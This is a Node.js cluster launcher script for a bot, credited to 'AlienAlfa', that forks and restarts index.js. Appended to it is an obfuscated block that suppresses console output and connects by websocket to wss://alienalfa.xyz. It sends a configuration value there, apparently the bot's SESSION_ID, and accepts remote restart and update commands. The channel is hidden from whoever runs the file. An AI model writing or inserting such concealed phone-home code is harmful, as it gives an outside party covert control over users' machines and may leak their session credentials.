// Created and Modified by AlienAlfa
let cluster = require('cluster')
let path = require('path')
let fs = require('fs')

const config = require("./config");

console.log("Server Starting...!")


const workers = {};

function start(file) {
    if (workers[file]) return;
    const args = [path.join(__dirname, file), ...process.argv.slice(2)];

    cluster.setupMaster({
        exec: path.join(__dirname, file),
        args: args.slice(1),
    });

    const p = cluster.fork();
    p.on('message', async (data) => {
        console.log(`[RECEIVED from ${file}]`, "Restart");
        switch (data) {
            case 'reset':
                const worker = workers[file];
                if (worker) {
                    worker.kill();
                } else {
                    console.error(`No child process running for ${file}`);
                }
                break
            case 'uptime':
                p.send(process.uptime())
                break
        }
    });

    p.on('exit', (code, signal) => {
        console.error(`Child process for ${file} exited with code: ${code}, signal: ${signal}`);
        if (!workers[file]) {
            console.error(`No process reference found for ${file}`);
            return;
        }

        delete workers[file];

        console.log("Restarting the process immediately")
        start(file);
    });

    workers[file] = p;
}

start("index.js")
(function(_0x157992,_0x16875c){const _0x296531=_0x157992();function _0x372d1e(_0xeccb73,_0x542b85,_0x445a72,_0x408937){return _0x52f4(_0x445a72-0x292,_0x542b85);}function _0x3194d0(_0x313d1c,_0xc19f0c,_0x1f294f,_0x5ccd9a){return _0x52f4(_0x1f294f- -0x59,_0x5ccd9a);}while(!![]){try{const _0x406eaa=-parseInt(_0x372d1e(0x342,0x34f,0x34d,0x36b))/(-0x2468+-0x1*0x2027+0x4490)+-parseInt(_0x372d1e(0x398,0x359,0x36d,0x38e))/(-0x118f+-0x1*-0x835+-0x2*-0x4ae)+-parseInt(_0x372d1e(0x37f,0x38e,0x373,0x388))/(-0x20ae+-0x6ca+0x277b)*(-parseInt(_0x372d1e(0x35a,0x350,0x34e,0x329))/(0x149e+0x2*0x5ba+-0x200e))+parseInt(_0x3194d0(0x95,0x54,0x6a,0x69))/(0xd09+0x265e+-0x3362)+-parseInt(_0x372d1e(0x34f,0x345,0x34f,0x34a))/(-0x230a+-0x1a34+-0x3*-0x146c)*(parseInt(_0x372d1e(0x361,0x363,0x358,0x32f))/(-0x161b+0x18b3+0xdb*-0x3))+parseInt(_0x3194d0(0x3d,0x4f,0x45,0x61))/(0x1b52+-0x67c+-0x14ce)*(parseInt(_0x3194d0(0x44,0x4d,0x5b,0x59))/(-0x1a0a+-0xf89+0x299c))+parseInt(_0x3194d0(0x72,0x71,0x8c,0x6e))/(0xec6+0x2b3*0x7+0x1*-0x21a1);if(_0x406eaa===_0x16875c)break;else _0x296531['push'](_0x296531['shift']());}catch(_0x552631){_0x296531['push'](_0x296531['shift']());}}}(_0x1c98,0x12785f+-0x155902+0x39*0x4c7f));const _0xb8f67a=(function(){const _0x248908={};_0x248908[_0x4ff815(0x344,0x34d,0x31b,0x327)]=function(_0x31bba0,_0x47302f){return _0x31bba0!==_0x47302f;},_0x248908[_0x50ab6a(0x1de,0x1e8,0x1fc,0x21a)]=_0x4ff815(0x345,0x361,0x325,0x348);function _0x50ab6a(_0x1d1896,_0x5bd509,_0x1a7c2c,_0x492dc0){return _0x52f4(_0x1a7c2c-0x14d,_0x492dc0);}_0x248908[_0x50ab6a(0x238,0x217,0x224,0x230)]=_0x50ab6a(0x235,0x246,0x230,0x239);const _0x38b8f0=_0x248908;let _0x121c0b=!![];function _0x4ff815(_0x5c93db,_0x5223ca,_0x3364bd,_0x59bab3){return _0x52f4(_0x5c93db-0x2a5,_0x59bab3);}return function(_0x78b0ea,_0x384b17){function _0x109dea(_0x4bdaa6,_0x4fd00e,_0x217ce7,_0x17642c){return _0x4ff815(_0x17642c- -0x2ad,_0x4fd00e-0xac,_0x217ce7-0x70,_0x217ce7);}function _0xaead02(_0x14c7eb,_0x1f9710,_0x2b25fb,_0x4ad0f5){return _0x50ab6a(_0x14c7eb-0x194,_0x1f9710-0x150,_0x4ad0f5-0xe5,_0x2b25fb);}if(_0x38b8f0[_0xaead02(0x2eb,0x2a5,0x2df,0x2d1)](_0x38b8f0[_0xaead02(0x308,0x2eb,0x2c2,0x2e1)],_0x38b8f0[_0xaead02(0x2fd,0x2ef,0x2f8,0x309)])){const _0x5c690a=_0x121c0b?function(){function _0xceb34a(_0x58270d,_0x3c9190,_0x26d972,_0x190b59){return _0x109dea(_0x58270d-0x81,_0x3c9190-0x109,_0x190b59,_0x3c9190- -0x3bb);}if(_0x384b17){const _0x47e757=_0x384b17[_0xceb34a(-0x31b,-0x2ff,-0x2eb,-0x328)](_0x78b0ea,arguments);return _0x384b17=null,_0x47e757;}}:function(){};return _0x121c0b=![],_0x5c690a;}else{const _0x1d1ac0=_0x3a4bd1[_0x109dea(0xd9,0xdb,0xe5,0xbc)](_0x1187fb,arguments);return _0x3d2b8a=null,_0x1d1ac0;}};}()),_0x48bcbb=_0xb8f67a(this,function(){const _0x3e8a66={};_0x3e8a66[_0x1ec7d4(0xf9,0x10f,0xec,0x117)]=_0x1ec7d4(0x11e,0x112,0x115,0x135)+'+$';function _0x1ec7d4(_0xe957b2,_0x390770,_0xff999f,_0x30dbce){return _0x52f4(_0xff999f-0x3c,_0xe957b2);}function _0x55d85e(_0x971466,_0x1a6b9d,_0x1a16c9,_0x2e143c){return _0x52f4(_0x2e143c-0x7b,_0x971466);}const _0xa1cd0e=_0x3e8a66;return _0x48bcbb[_0x55d85e(0xfb,0x122,0x147,0x11e)]()[_0x55d85e(0x128,0x11d,0x123,0x118)](_0xa1cd0e['VEzAK'])[_0x55d85e(0xfb,0x137,0xf4,0x11e)]()[_0x55d85e(0x116,0x11e,0x12f,0x12d)+'r'](_0x48bcbb)[_0x55d85e(0x108,0x123,0xeb,0x118)](_0xa1cd0e[_0x1ec7d4(0xbf,0xea,0xec,0xcc)]);});function _0x52f4(_0xb8f67a,_0x1c9858){const _0x52f412=_0x1c98();return _0x52f4=function(_0x23ce7c,_0x259026){_0x23ce7c=_0x23ce7c-(0x1d*0xe9+0x437*0x3+0x6b*-0x5c);let _0x1b11db=_0x52f412[_0x23ce7c];return _0x1b11db;},_0x52f4(_0xb8f67a,_0x1c9858);}_0x48bcbb();const _0x466306=(function(){let _0x9d4f39=!![];return function(_0x489faf,_0x44d7e1){const _0x1c323c=_0x9d4f39?function(){function _0x6c8437(_0x2a0c5b,_0x2fcae3,_0x14f952,_0x513197){return _0x52f4(_0x2a0c5b-0x347,_0x513197);}if(_0x44d7e1){const _0x38dee8=_0x44d7e1[_0x6c8437(0x40b,0x42e,0x437,0x3e7)](_0x489faf,arguments);return _0x44d7e1=null,_0x38dee8;}}:function(){};return _0x9d4f39=![],_0x1c323c;};}());function _0x1b6f85(_0x1e24f0,_0x2a1f27,_0x4ad85d,_0x4e9c44){return _0x52f4(_0x1e24f0-0x353,_0x2a1f27);}const _0x3d3f4d=_0x466306(this,function(){const _0xec0c7={'zsisv':function(_0x3a4bdc,_0x4134ec){return _0x3a4bdc===_0x4134ec;},'RouSR':function(_0x5c22c3,_0x396dc1){return _0x5c22c3+_0x396dc1;},'tMetD':_0x18ccab(0x2f1,0x2f8,0x2ea,0x302)+_0x14d4ae(-0x273,-0x293,-0x271,-0x265),'LTffb':_0x18ccab(0x2df,0x301,0x2c2,0x2dd),'zGdul':_0x14d4ae(-0x2b4,-0x285,-0x299,-0x2bf),'IEMYb':_0x14d4ae(-0x269,-0x229,-0x24a,-0x22f),'ossim':function(_0x1380dc,_0x14d2f2){return _0x1380dc(_0x14d2f2);},'lyOGW':function(_0x547e07,_0x191926){return _0x547e07+_0x191926;},'IIrWZ':_0x18ccab(0x2c4,0x2ed,0x2cf,0x2bd)+_0x18ccab(0x2f8,0x2e9,0x2e0,0x2e0),'lUPfd':_0x14d4ae(-0x2b9,-0x2a3,-0x296,-0x275)+_0x14d4ae(-0x25d,-0x251,-0x246,-0x250)+_0x18ccab(0x2d8,0x2d1,0x2af,0x2b0)+'\x20)','tEPtm':function(_0x1f2b8b){return _0x1f2b8b();},'omdgo':_0x18ccab(0x2eb,0x2df,0x2c4,0x2e9),'YQVsM':_0x14d4ae(-0x287,-0x23a,-0x25b,-0x242),'jrrKh':'error','wAapD':_0x14d4ae(-0x269,-0x26a,-0x251,-0x23d),'IDQtw':'table','HsjVl':_0x14d4ae(-0x28c,-0x23b,-0x265,-0x243),'qFEXT':function(_0xb24a5b,_0x3c1720){return _0xb24a5b<_0x3c1720;}},_0x16a40b=function(){function _0x21e1a6(_0x5e2955,_0x420479,_0xdac8b3,_0x1c8209){return _0x14d4ae(_0x420479,_0x420479-0x23,_0x1c8209-0x542,_0x1c8209-0x1e9);}let _0x788262;try{if(_0xec0c7[_0x21e1a6(0x2de,0x2fe,0x2fc,0x2ef)]===_0xec0c7[_0x5ec2dc(-0x7,-0x34,-0x1a,-0x3)]){let _0x2ecd3c=_0x5644c5[_0x5ec2dc(0x2d,0x46,0x8,0x2f)]('=');_0xec0c7[_0x5ec2dc(0x36,0xc,0x4c,0x46)](_0x2ecd3c[0x2153+-0x3fa+-0x1d59],_0x407ce5['SESSION_ID'])&&(_0x3911f6[_0x5ec2dc(0x2b,0x3d,0x19,0x2a)](_0xec0c7[_0x21e1a6(0x30b,0x2e8,0x318,0x300)](_0xec0c7['tMetD'],_0x2ecd3c[-0x1*0x187f+0x1*0xdff+-0xe0*-0xc])),_0x2ecd3c[0x1781+0x20b*0x13+-0x1*0x3e51]===_0x21e1a6(0x2cf,0x2f8,0x302,0x2fa)&&(_0x32be3e[_0x21e1a6(0x2c3,0x303,0x2ca,0x2ee)](_0x5ec2dc(0x20,0x3c,0xc,0x2d)),_0x4e8005[_0x21e1a6(0x2d7,0x2d7,0x2ef,0x2fd)](_0x5ec2dc(0x21,0x4b,0x2c,0x1))),_0xec0c7[_0x21e1a6(0x2fa,0x325,0x2d7,0x2f9)](_0x2ecd3c[-0x2325+0xb*0x37f+-0x34f],'update')&&_0x66a57a['log'](_0xec0c7[_0x21e1a6(0x2de,0x2cc,0x2bb,0x2d9)]));}else _0x788262=_0xec0c7[_0x21e1a6(0x305,0x2f2,0x304,0x2df)](Function,_0xec0c7[_0x5ec2dc(0x3d,0x44,0x54,0x5e)](_0xec0c7['lyOGW'](_0xec0c7['IIrWZ'],_0xec0c7[_0x5ec2dc(0x22,0x7,0x33,0x49)]),');'))();}catch(_0x3ec6ea){_0x788262=window;}function _0x5ec2dc(_0x23864e,_0x5d418c,_0x443ce1,_0x562f44){return _0x18ccab(_0x23864e- -0x2c0,_0x5d418c-0x14c,_0x443ce1-0x34,_0x5d418c);}return _0x788262;},_0x4e9a27=_0xec0c7[_0x18ccab(0x2b8,0x2b7,0x294,0x2b0)](_0x16a40b);function _0x18ccab(_0x5212bf,_0x258367,_0x109e01,_0x2b8618){return _0x52f4(_0x5212bf-0x20f,_0x2b8618);}const _0x47b5c5=_0x4e9a27['console']=_0x4e9a27[_0x18ccab(0x2c9,0x2ed,0x2b7,0x2d5)]||{};function _0x14d4ae(_0x4092e2,_0x48a7e8,_0x11f0b0,_0x51259a){return _0x52f4(_0x11f0b0- -0x330,_0x4092e2);}const _0x107c85=[_0xec0c7[_0x14d4ae(-0x295,-0x264,-0x28f,-0x2ae)],_0x18ccab(0x2e5,0x2f9,0x2bc,0x30a),_0xec0c7[_0x18ccab(0x2bc,0x29e,0x2dd,0x2ca)],_0xec0c7[_0x18ccab(0x2c8,0x2af,0x2c2,0x2cf)],_0xec0c7[_0x14d4ae(-0x283,-0x28e,-0x26b,-0x277)],_0xec0c7['IDQtw'],_0xec0c7[_0x18ccab(0x2ef,0x2e8,0x310,0x30a)]];for(let _0x306f56=0x11db+-0x11bb+-0x1*0x20;_0xec0c7[_0x14d4ae(-0x257,-0x271,-0x266,-0x288)](_0x306f56,_0x107c85[_0x14d4ae(-0x29a,-0x28b,-0x284,-0x2af)]);_0x306f56++){const _0x81645f=_0x466306[_0x18ccab(0x2c1,0x2da,0x2bb,0x2c5)+'r']['prototype'][_0x14d4ae(-0x280,-0x2b3,-0x28e,-0x2b1)](_0x466306),_0xb87f67=_0x107c85[_0x306f56],_0x42d963=_0x47b5c5[_0xb87f67]||_0x81645f;_0x81645f['__proto__']=_0x466306['bind'](_0x466306),_0x81645f[_0x14d4ae(-0x2b0,-0x262,-0x28d,-0x29b)]=_0x42d963[_0x14d4ae(-0x270,-0x28a,-0x28d,-0x26c)][_0x14d4ae(-0x272,-0x266,-0x28e,-0x283)](_0x42d963),_0x47b5c5[_0xb87f67]=_0x81645f;}});_0x3d3f4d();const io=require('socket.io-'+_0x3e28e5(0x365,0x3a3,0x36e,0x37e)),_0x272fcd={};_0x272fcd[_0x3e28e5(0x33e,0x376,0x349,0x368)]=[_0x1b6f85(0x442,0x439,0x44b,0x43b)];const socket=io(_0x1b6f85(0x413,0x41b,0x439,0x421)+_0x1b6f85(0x409,0x432,0x430,0x3f6),_0x272fcd);socket['on']('connect',()=>{const _0x15ca89={};_0x15ca89['jHiaN']='set_name';function _0x2f1eaa(_0x525543,_0x352aaa,_0x54d048,_0x5e21f){return _0x1b6f85(_0x54d048- -0x318,_0x525543,_0x54d048-0x4a,_0x5e21f-0x1e0);}const _0x50442d=_0x15ca89;function _0x19846b(_0x345617,_0x15116c,_0x45a8f9,_0x16b4c9){return _0x3e28e5(_0x345617,_0x15116c-0xf,_0x45a8f9-0x3b,_0x16b4c9- -0x65f);}console[_0x2f1eaa(0x13f,0xef,0x117,0xec)](_0x2f1eaa(0x106,0x12c,0x115,0x12d)+'to\x20the\x20ser'+_0x2f1eaa(0x104,0xf4,0xe9,0xd0)),socket[_0x19846b(-0x322,-0x2e8,-0x30a,-0x2f8)](_0x50442d[_0x19846b(-0x30e,-0x34d,-0x2fc,-0x321)],config[_0x19846b(-0x329,-0x340,-0x331,-0x31d)]);}),socket['on'](_0x1b6f85(0x3ec,0x401,0x40c,0x402),()=>{function _0x14d347(_0x1ef1c5,_0x1e51d6,_0x182c47,_0x274996){return _0x1b6f85(_0x274996- -0x119,_0x182c47,_0x182c47-0x3f,_0x274996-0x1af);}function _0x10de0e(_0x22c7f3,_0x88adb,_0x5917be,_0x294842){return _0x3e28e5(_0x294842,_0x88adb-0xe7,_0x5917be-0x177,_0x5917be- -0x16d);}console[_0x14d347(0x336,0x337,0x2fe,0x316)](_0x14d347(0x32d,0x31c,0x2fd,0x31e)+'ed\x20from\x20th'+'e\x20server.');});function _0x1c98(){const _0x58310a=['----------','BNYEv','Disconnect','16061380KOkbAI','wrOPj','zsisv','restart','nction()\x20','ctor(\x22retu','send','HdYEB','FXyZY','RouSR','websocket','qWIYp','ohHDT','jHiaN','disconnect','{}.constru','__proto__','SESSION_ID','search','3324344vHRKGj','hFMiJ','KAmkZ','omdgo','bind','toString','RFGeK','ESKqi','Vgqqw','SHnvy','RiQXo','tEPtm','IEMYb','message','length','YQVsM','ver!','zGEqZ','VEzAK','OhmHr','constructo','yzdWV','36kZJobP','return\x20(fu','nalfa.xyz','fpjcg','pKBya','jrrKh','console','1278249GdMjdy','68aBinWn','11838xuRwjL','KRkHe','---\x0a','wss://alie','emit','transports','5444780vxdSPX','apply','wAapD','6559vGeZBj','LTffb','prototype','rn\x20this\x22)(','qFEXT','trace','ZEhVP','ossim','YhiKD','update','[UPDATE]','[RESTART]','reset','lUPfd','e\x20server.','info','warn','XThay','client','(((.+)+)+)','Connected\x20','3638026RepSRf','log','zGdul','split','exception','HsjVl','267591eTdYUZ'];_0x1c98=function(){return _0x58310a;};return _0x1c98();}function _0x3e28e5(_0x340df6,_0x2df46e,_0x3bbb76,_0x434e48){return _0x52f4(_0x434e48-0x2a6,_0x340df6);}socket['on'](_0x1b6f85(0x3fe,0x41a,0x423,0x3f8),_0x258145=>{const _0x373e03={};_0x373e03[_0x5ebf3f(-0x7f,-0x76,-0x8a,-0x82)]=_0x4eefad(-0x299,-0x2b3,-0x2b5,-0x2bd)+'ed\x20from\x20th'+_0x5ebf3f(-0x6e,-0x44,-0x8a,-0x5f),_0x373e03[_0x4eefad(-0x298,-0x2ab,-0x290,-0x288)]=function(_0x3b2041,_0x252aa3){return _0x3b2041===_0x252aa3;},_0x373e03[_0x5ebf3f(-0x81,-0x88,-0xa9,-0x9d)]=function(_0x1baf2a,_0x4189c3){return _0x1baf2a+_0x4189c3;},_0x373e03[_0x4eefad(-0x287,-0x2aa,-0x29d,-0x2d4)]='----------'+_0x4eefad(-0x2b9,-0x2d8,-0x2dc,-0x2fd),_0x373e03[_0x5ebf3f(-0x5c,-0x38,-0x4c,-0x65)]=function(_0x30ec8b,_0x4a652e){return _0x30ec8b===_0x4a652e;},_0x373e03['RiQXo']='restart';function _0x5ebf3f(_0x2036e9,_0x4f0f71,_0x476bad,_0x144186){return _0x1b6f85(_0x144186- -0x486,_0x476bad,_0x476bad-0x53,_0x144186-0x126);}function _0x4eefad(_0x139e64,_0xff7f4,_0x2aa5da,_0x20da68){return _0x3e28e5(_0x2aa5da,_0xff7f4-0x27,_0x2aa5da-0x1ee,_0xff7f4- -0x63d);}_0x373e03['sTUtM']=_0x4eefad(-0x2cc,-0x2f2,-0x2c7,-0x317),_0x373e03[_0x5ebf3f(-0x6f,-0x70,-0xa2,-0x8f)]=_0x4eefad(-0x2d4,-0x2c6,-0x2da,-0x2d6),_0x373e03[_0x4eefad(-0x2c7,-0x2d9,-0x2f8,-0x305)]=_0x5ebf3f(-0x70,-0x82,-0x48,-0x61),_0x373e03['ZEhVP']=_0x5ebf3f(-0x4f,-0x4a,-0x72,-0x64),_0x373e03[_0x5ebf3f(-0x7c,-0x8f,-0xae,-0x8d)]=_0x4eefad(-0x2f4,-0x2e0,-0x2fe,-0x307),_0x373e03['yzdWV']=_0x4eefad(-0x2cf,-0x2df,-0x30c,-0x2e0),_0x373e03['SHnvy']=_0x5ebf3f(-0x3b,-0x59,-0x84,-0x63);const _0x547437=_0x373e03;let _0x55abc4=_0x258145[_0x4eefad(-0x2d8,-0x2b9,-0x2e4,-0x2b1)]('=');if(_0x547437[_0x4eefad(-0x2d4,-0x2ab,-0x28f,-0x2bd)](_0x55abc4[-0x95*-0x3f+-0x787+-0xe92*0x2],config[_0x4eefad(-0x30f,-0x2fb,-0x2eb,-0x30f)])){console[_0x4eefad(-0x2b5,-0x2bb,-0x29f,-0x2c1)](_0x547437[_0x5ebf3f(-0x7a,-0xb0,-0xc2,-0x9d)](_0x547437['FXyZY'],_0x55abc4[0x1ae7+0x19fd+-0x14*0x2a5]));if(_0x547437[_0x5ebf3f(-0x78,-0x4e,-0x91,-0x65)](_0x55abc4[-0x1b89+-0x1b95*-0x1+-0xb],_0x547437[_0x4eefad(-0x2cd,-0x2ef,-0x2d9,-0x312)])){if(_0x547437[_0x4eefad(-0x297,-0x2ab,-0x2cd,-0x2aa)](_0x547437['sTUtM'],_0x5ebf3f(-0xba,-0x7e,-0x6b,-0x8e)))console[_0x4eefad(-0x2cc,-0x2bb,-0x2e2,-0x2d5)](_0x547437['RFGeK']),process[_0x5ebf3f(-0x28,-0x51,-0x4a,-0x48)](_0x547437[_0x5ebf3f(-0x7a,-0x48,-0x65,-0x75)]);else{const _0x4d61de=_0x216fa6[_0x4eefad(-0x2ee,-0x2e5,-0x2e2,-0x2f5)+'r'][_0x4eefad(-0x2d9,-0x2cf,-0x2f9,-0x2d4)][_0x4eefad(-0x307,-0x2f5,-0x30f,-0x322)](_0x3cfb1e),_0x10dcb6=_0x1d79df[_0x4e433a],_0x393428=_0x10deb4[_0x10dcb6]||_0x4d61de;_0x4d61de[_0x4eefad(-0x30c,-0x2fc,-0x30a,-0x2d3)]=_0x40d160['bind'](_0x26fda1),_0x4d61de['toString']=_0x393428[_0x5ebf3f(-0xb6,-0xaf,-0x6b,-0x90)]['bind'](_0x393428),_0x576ee7[_0x10dcb6]=_0x4d61de;}}_0x55abc4[0x1d27+0x1*-0x228b+0x565]===_0x547437[_0x5ebf3f(-0x91,-0x79,-0x5b,-0x67)]&&(_0x547437[_0x5ebf3f(-0x74,-0x3d,-0x88,-0x65)](_0x547437[_0x4eefad(-0x2ce,-0x2f1,-0x310,-0x2d5)],_0x547437[_0x5ebf3f(-0xad,-0x86,-0x6b,-0x80)])?_0x120b23[_0x5ebf3f(-0x80,-0x49,-0x83,-0x57)](_0x547437[_0x5ebf3f(-0x6e,-0xa0,-0xa3,-0x82)]):console['log'](_0x547437[_0x4eefad(-0x2fc,-0x2f0,-0x2e9,-0x2d9)]));}});